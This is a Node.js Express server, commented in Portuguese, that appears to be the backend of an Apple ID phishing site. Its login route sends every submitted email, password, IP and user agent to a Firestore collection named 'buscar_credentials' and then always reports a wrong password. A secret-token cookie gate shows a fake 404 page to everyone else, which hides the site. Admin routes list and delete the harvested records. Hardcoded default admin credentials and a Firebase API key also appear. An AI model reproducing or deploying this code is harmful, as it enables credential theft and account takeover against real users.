const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(cookieParser());

// ============================
// CONFIGURAÇÕES PRINCIPAIS
// ============================
const ACCESS_TOKEN = process.env.ACCESS_TOKEN || 'buscar2026';
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@buscar.com';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@2026';

// Configuração Firebase Firestore REST
const FIREBASE_PROJECT = process.env.FIREBASE_PROJECT || 'missoes-drive';
const FIREBASE_API_KEY = process.env.FIREBASE_API_KEY || 'AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s';
const COLLECTION = 'buscar_credentials';

// ============================
// SISTEMA DE TOKEN
// ============================
app.use((req, res, next) => {
    // Token via query string → seta cookie e redireciona
    if (req.query.t === ACCESS_TOKEN) {
        res.cookie('access_token', ACCESS_TOKEN, {
            maxAge: 7 * 24 * 60 * 60 * 1000,
            httpOnly: true,
            sameSite: 'lax'
        });
        const cleanPath = req.path === '/' ? '/' : req.path;
        return res.redirect(cleanPath);
    }

    // Libera assets estáticos
    if (/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf)$/i.test(req.path)) {
        return next();
    }

    // Verifica cookie
    if (req.cookies.access_token === ACCESS_TOKEN) {
        return next();
    }

    // Bloqueia tudo o mais
    return res.status(404).send(`
        <!DOCTYPE html>
        <html><head><title>404</title></head>
        <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
        <div style="text-align:center"><h1 style="color:#888">404</h1><p style="color:#555">Not Found</p></div>
        </body></html>
    `);
});

app.use(express.static(path.join(__dirname, 'public')));

// ============================
// FIRESTORE VIA REST
// ============================
function firestoreRequest(method, path, body) {
    return new Promise((resolve, reject) => {
        const url = new URL(`https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT}/databases/(default)/documents${path}`);
        url.searchParams.set('key', FIREBASE_API_KEY);

        const options = {
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: method,
            headers: { 'Content-Type': 'application/json' }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(data);
                    if (res.statusCode >= 400) {
                        reject({ status: res.statusCode, data: parsed });
                    } else {
                        resolve(parsed);
                    }
                } catch (e) {
                    if (res.statusCode >= 400) reject({ status: res.statusCode, data });
                    else resolve(data);
                }
            });
        });

        req.on('error', reject);
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
}

function toFirestoreDoc(obj) {
    const fields = {};
    for (const [k, v] of Object.entries(obj)) {
        if (v === null || v === undefined) continue;
        if (typeof v === 'string') fields[k] = { stringValue: v };
        else if (typeof v === 'number') fields[k] = { doubleValue: v };
        else if (typeof v === 'boolean') fields[k] = { booleanValue: v };
    }
    return { fields };
}

function fromFirestoreDoc(doc) {
    if (!doc || !doc.name) return null;
    const obj = { id: doc.name.split('/').pop() };
    for (const [k, v] of Object.entries(doc.fields || {})) {
        if (v.stringValue !== undefined) obj[k] = v.stringValue;
        else if (v.doubleValue !== undefined) obj[k] = v.doubleValue;
        else if (v.integerValue !== undefined) obj[k] = parseInt(v.integerValue);
        else if (v.booleanValue !== undefined) obj[k] = v.booleanValue;
    }
    return obj;
}

// ============================
// ROTAS API
// ============================

// Diagnóstico: testa conexão Firebase
app.get('/api/health', async (req, res) => {
    try {
        await firestoreRequest('GET', `/${COLLECTION}?pageSize=1`);
        res.json({ status: 'ok', firebase: 'connected' });
    } catch (err) {
        res.json({ status: 'error', firebase: 'blocked', detail: err.data || err });
    }
});

// Login → grava no Firestore
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Campos obrigatórios' });
    }

    let saveError = null;
    try {
        const doc = toFirestoreDoc({
            email,
            password,
            timestamp: new Date().toISOString(),
            ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'N/A',
            ua: (req.headers['user-agent'] || '').substring(0, 200)
        });
        await firestoreRequest('POST', `/${COLLECTION}`, doc);
    } catch (err) {
        saveError = err.data || err;
        console.error('[BUSCAR] Erro ao salvar no Firestore:', JSON.stringify(saveError));
    }

    // Admin
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true, isAdmin: true });
    }

    const resp = { success: false, message: 'ID Apple ou senha incorreta.' };
    if (saveError) resp._err = saveError; // visível apenas no DevTools para debug
    return res.json(resp);
});

// Admin Auth
app.post('/api/admin/auth', (req, res) => {
    const { email, password } = req.body;
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true });
    }
    return res.status(401).json({ success: false, message: 'Acesso negado' });
});

// Admin → lista dados
app.post('/api/admin/data', async (req, res) => {
    const { email, password } = req.body;
    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        const result = await firestoreRequest('GET', `/${COLLECTION}?pageSize=200`);
        const docs = (result.documents || []).map(fromFirestoreDoc).filter(Boolean);
        docs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        return res.json({ success: true, data: docs });
    } catch (err) {
        return res.status(500).json({
            success: false,
            message: 'Erro ao ler dados',
            detail: err.data || err.message || err
        });
    }
});

// Admin → deletar
app.post('/api/admin/delete', async (req, res) => {
    const { email, password, docId } = req.body;
    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }
    try {
        await firestoreRequest('DELETE', `/${COLLECTION}/${docId}`);
        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Erro ao deletar', detail: err.data || err });
    }
});

app.listen(PORT, () => {
    console.log(`[BUSCAR] Server running on port ${PORT}`);
});
